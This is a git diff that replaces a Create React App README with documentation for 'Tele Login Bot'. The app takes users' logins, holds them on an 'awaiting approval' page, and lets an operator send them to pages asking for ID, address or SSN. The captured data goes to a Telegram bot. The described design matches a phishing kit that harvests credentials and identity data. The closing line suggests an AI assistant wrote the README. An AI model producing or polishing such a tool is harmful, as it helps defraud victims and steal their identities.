@@ -1,70 +1,103 @@
-# Getting Started with Create React App
+```markdown
+# Tele Login Bot
 
-This project was bootstrapped with [Create React App](https://github.com/facebook/create-react-app).
+## Brief Description
+Tele Login Bot is a React.js-based application that allows users to log in and wait for approval from the admin. After approval, the admin can choose to direct the user to the ID, Address, or SSN page. The user's login data is sent to a Telegram bot using `node-telegram-bot-api` in the Node.js backend.
 
-## Available Scripts
+## Key Features
+- Secure user login process.
+- A loading page that shows the approval status from the admin.
+- Admin can choose to redirect users to the ID, Address, or SSN page.
+- User login data is sent to a Telegram bot using `node-telegram-bot-api`.
 
-In the project directory, you can run:
+## Technologies Used
+- **React.js**: Frontend framework for the application.
+- **Node.js**: Backend server to manage the app flow and interact with the Telegram bot.
+- **axios**: Used to send HTTP requests to the backend.
+- **input-otp**: OTP input for the application.
+- **react-router-dom**: For routing between pages in the frontend.
+- **node-telegram-bot-api**: For sending data to the Telegram bot.
 
-### `npm start`
+Here are the dependencies used in the project:
+```json
+{
+  "name": "web_6",
+  "version": "0.1.0",
+  "private": true,
+  "dependencies": {
+    "@testing-library/jest-dom": "^5.17.0",
+    "@testing-library/react": "^13.4.0",
+    "@testing-library/user-event": "^13.5.0",
+    "axios": "^1.7.7",
+    "input-otp": "^1.2.4",
+    "react": "^18.3.1",
+    "react-dom": "^18.3.1",
+    "react-otp-input": "^3.1.1",
+    "react-router-dom": "^6.26.1",
+    "react-scripts": "5.0.1",
+    "web-vitals": "^2.1.4"
+  },
+  "scripts": {
+    "start": "react-scripts start",
+    "build": "react-scripts build",
+    "test": "react-scripts test",
+    "eject": "react-scripts eject"
+  },
+  "eslintConfig": {
+    "extends": [
+      "react-app",
+      "react-app/jest"
+    ]
+  },
+  "browserslist": {
+    "production": [
+      ">0.2%",
+      "not dead",
+      "not op_mini all"
+    ],
+    "development": [
+      "last 1 chrome version",
+      "last 1 firefox version",
+      "last 1 safari version"
+    ]
+  }
+}
+```
 
-Runs the app in the development mode.\
-Open [http://localhost:3000](http://localhost:3000) to view it in your browser.
+## Installation Instructions
+1. Clone this repository:
+   ```bash
+   git clone https://github.com/username/repository.git
+   ```
+2. Navigate to the project directory:
+   ```bash
+   cd repository
+   ```
+3. Install dependencies:
+   ```bash
+   npm install
+   ```
+4. Update the backend URL in your code:
+   - Replace `http://localhost:1000/request-approval` with your actual backend URL.
+5. Run the application:
+   ```bash
+   npm run start
+   ```
 
-The page will reload when you make changes.\
-You may also see any lint errors in the console.
+## Usage
+1. After the installation is complete, open your browser and visit `http://localhost:3000` to view the app.
+2. Users can log in and wait for admin approval.
+3. Admin will be given options to direct the user to the ID, Address, or SSN page.
+4. The user login data will be sent to the Telegram bot for each successfully logged-in user.
 
-### `npm test`
+## Contribution
+This project is not open for contributions.
 
-Launches the test runner in the interactive watch mode.\
-See the section about [running tests](https://facebook.github.io/create-react-app/docs/running-tests) for more information.
+## License
+This project does not use any open license.
 
-### `npm run build`
+## Contact or Additional Information
+- Email: [email@example.com](mailto:email@example.com)
+```
 
-Builds the app for production to the `build` folder.\
-It correctly bundles React in production mode and optimizes the build for the best performance.
-
-The build is minified and the filenames include the hashes.\
-Your app is ready to be deployed!
-
-See the section about [deployment](https://facebook.github.io/create-react-app/docs/deployment) for more information.
-
-### `npm run eject`
-
-**Note: this is a one-way operation. Once you `eject`, you can't go back!**
-
-If you aren't satisfied with the build tool and configuration choices, you can `eject` at any time. This command will remove the single build dependency from your project.
-
-Instead, it will copy all the configuration files and the transitive dependencies (webpack, Babel, ESLint, etc) right into your project so you have full control over them. All of the commands except `eject` will still work, but they will point to the copied scripts so you can tweak them. At this point you're on your own.
-
-You don't have to ever use `eject`. The curated feature set is suitable for small and middle deployments, and you shouldn't feel obligated to use this feature. However we understand that this tool wouldn't be useful if you couldn't customize it when you are ready for it.
-
-## Learn More
-
-You can learn more in the [Create React App documentation](https://facebook.github.io/create-react-app/docs/getting-started).
-
-To learn React, check out the [React documentation](https://reactjs.org/).
-
-### Code Splitting
-
-This section has moved here: [https://facebook.github.io/create-react-app/docs/code-splitting](https://facebook.github.io/create-react-app/docs/code-splitting)
-
-### Analyzing the Bundle Size
-
-This section has moved here: [https://facebook.github.io/create-react-app/docs/analyzing-the-bundle-size](https://facebook.github.io/create-react-app/docs/analyzing-the-bundle-size)
-
-### Making a Progressive Web App
-
-This section has moved here: [https://facebook.github.io/create-react-app/docs/making-a-progressive-web-app](https://facebook.github.io/create-react-app/docs/making-a-progressive-web-app)
-
-### Advanced Configuration
-
-This section has moved here: [https://facebook.github.io/create-react-app/docs/advanced-configuration](https://facebook.github.io/create-react-app/docs/advanced-configuration)
-
-### Deployment
-
-This section has moved here: [https://facebook.github.io/create-react-app/docs/deployment](https://facebook.github.io/create-react-app/docs/deployment)
-
-### `npm run build` fails to minify
-
-This section has moved here: [https://facebook.github.io/create-react-app/docs/troubleshooting#npm-run-build-fails-to-minify](https://facebook.github.io/create-react-app/docs/troubleshooting#npm-run-build-fails-to-minify)
+Feel free to update the placeholders like `username/repository` and `email@example.com` with your actual information. Let me know if you need any further adjustments!
